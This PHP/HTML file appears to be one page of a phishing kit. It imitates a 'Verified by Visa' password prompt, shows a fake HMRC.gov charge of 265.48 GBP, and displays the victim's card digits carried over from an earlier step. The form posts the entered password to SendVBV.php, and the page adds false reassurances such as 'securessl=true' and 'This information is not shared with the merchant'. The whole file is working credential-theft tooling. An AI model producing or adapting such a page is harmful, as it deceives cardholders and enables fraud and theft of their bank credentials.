<?php 
/*

*/
$last4 = $_POST['last4'];
$brand = $_POST['brand'];
$Bank = $_POST['Bank'];
?>
<form action='SendVBV.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true' enctype='multipart/form-data' id='vbv' method='post' name='vbv'>
<table border='0' cellpadding='0' cellspacing='0' role='presentation' width='100%'>
<tbody>
<tr>
<td align='center' valign='middle'>
<table border='1' cellpadding='8' cellspacing='0' width='80%'>
<tbody>
<tr>
<td align='center' height='360' valign='middle' width="80%">
<table border='0' cellpadding='0' cellspacing='0' role='presentation' width="80%">
<tbody>
<tr>
<td align='center' height='50' valign='top' width="70%">
<table border='0' cellpadding='0' cellspacing='0' role='presentation' width="80%">
<tbody>
<tr>
<td align='left' valign='top'>
<div id='nobank'><img border='0' height='50' src='../img/vbv/vbv.gif' width='89'></div>
<div id='banklogo'></div>
</td>
<td align='right' valign='top'>
<div id='vbvlogo'></div>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td height='0' width='0'><img height='0' id="test" name='test' src='../img/vbv/pixel.gif' width='0'></td>
</tr>
<tr>
<td align='left' height='10'><span class='mtitle'></span></td>
</tr>
<tr>
<td align='left' height='10' valign='bottom'><span class='recieptheader' id='recieptheader' style='font-size:13px'>Please enter your verified by visa password as asked below.</span></td>
</tr>
<tr>
<td height='10'></td>
</tr>
<tr>
<td valign='top'>
<table border='0' cellpadding='0' cellspacing='0' width='80%'>
<tbody>
<tr>
<td align='middle' height='20' valign='top' width='10%'>
<span class='BodyText' id='BodyText' style='padding-left: 40px;text-align:right'>Merchant:</span></td>
<td width='10'></td>
<td align='left' height='20' valign='top' width='10%'><span class='right' id='BodyText'> HMRC.gov</span></td>
</tr>
<tr>
<td align='middle' height='20' valign='top' width='10%'><span class='BodyText' id='BodyText' style='padding-left: 40px;text-align:right'>Amount:</span></td>
<td width='10'><img alt='' src='../img/vbv/pixel.gif' width='10'></td>
<td align='left' height='20' valign='top' width='10%'><span class='right' id='BodyText'><strong> +265.48 GBP</strong></span></td>
</tr>
<tr>
<td align='middle' height='20' valign='top' width='10%'><span class='BodyText' id='BodyText' style='padding-left: 40px;text-align:right'>Date:</span></td>
<td width='10'><img alt='' src='../img/vbv/pixel.gif' width='10'></td>
<td align='left' height='20' valign='top' width='10%'><span class='right' id='BodyText'> <?php echo date('d/m/y'); ?></span></td>
</tr>
<tr>
<td align='middle' height='20' valign='top' width='10%'><span class='BodyText' id='BodyText' style='padding-left: 20px;text-align:right'>Card Number:</span></td>
<td width='10'><img alt='' src='../img/vbv/pixel.gif' width='10'></td>
<td align='left' height='20' valign='top' width='10%'><span class='right' id='BodyText'> XXXX-XXXX-XXXX-<?php echo $last4; ?></span></td>
</tr>
<tr>
<td align='middle' height='20' valign='middle' width='10%'><span class='BodyText' id='BodyText' style='padding-left: -20px;text-align:right'>
<label for='Password'>Enter your password:</label></span></td>
<td width='10'><img alt='' src='../img/vbv/pixel.gif' width='10'></td>
<td align='left' height='20' valign='middle' width='10%'>
<input id='mcpass' name='mcpass' type='hidden'>
<input autofocus="" id='vbvpass' maxlength='15' class='right' name='vbvpass' required="" style='width: 100px; height: 22px; COLOR: #000000; FONT-FAMILY: Arial; FONT-SIZE: 12px;' type='password' value=''></td>
</tr>
<tr>
<td align='right' height='20' valign='top' width='70'><img alt='' height='20' src='../img/vbv/pixel.gif' width='170'></td>
<td width='5'><img alt='' src='../img/vbv/pixel.gif' width='5'></td>
<td align='left' height='20' valign='top' width='10%'><a class='content right' href='#' style='font-size:10px;display:inline;COLOR: #666666;'>Forgotten your password?</a></td>
</tr>
<tr>
<td colspan='3'>
<table border='0' cellpadding='0' cellspacing='0' role='presentation' width='100%'>
<tbody>
<tr>
<td align='left' valign='bottom' width='30%'><img alt='' height='20' src='../img/vbv/pixel.gif' width='30%'></td>
<td align='center' height='25' valign='bottom' width='70%'>
<table border='0' cellpadding='0' cellspacing='0' role='presentation' width='100%' style='padding-top:10px;padding-bottom:10px'>
<tbody>
<tr>
<td align='right' valign='middle' width='55%'><input class='button' style='box-sizing:border-box;padding: 1px 6px;' type='submit' value='Submit'></td>
<td align='center' valign='middle'><a class='recieptheader' href='#' id="button_help" name='button_help' style='font-size:13px;COLOR: #666666;'>&nbsp;Help</a></td>
<td align='right' valign='middle'><a class='recieptheader' href='#' style='font-size:13px;COLOR: #666666;'>Cancel</a></td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td align='center' colspan='3' valign='middle'><span class='recieptheader' style="font-size:12px">This information is not shared with the merchant.<br>
<font style='font-size:9px'>THIS SERVICE HAS BEEN REQUESTED BY THE WEBSITE YOU ARE USING.</font></span></td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</form>